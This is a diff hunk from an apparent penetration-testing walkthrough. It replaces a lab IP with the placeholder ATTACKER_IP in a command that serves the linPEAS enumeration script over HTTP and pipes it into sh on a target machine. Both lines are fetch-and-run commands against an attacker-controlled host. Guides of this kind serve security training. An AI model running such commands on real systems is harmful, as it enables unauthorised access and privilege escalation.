@@ -36,7 +36,7 @@ Get linPEAS onto the target and run it (host it from your box, pull it on the ta
 # on your machine
 python3 -m http.server 8000
 # on the target
-curl http://10.10.14.5:8000/linpeas.sh | sh
+curl http://ATTACKER_IP:8000/linpeas.sh | sh
 ```
 
 Run it from disk and keep a log:
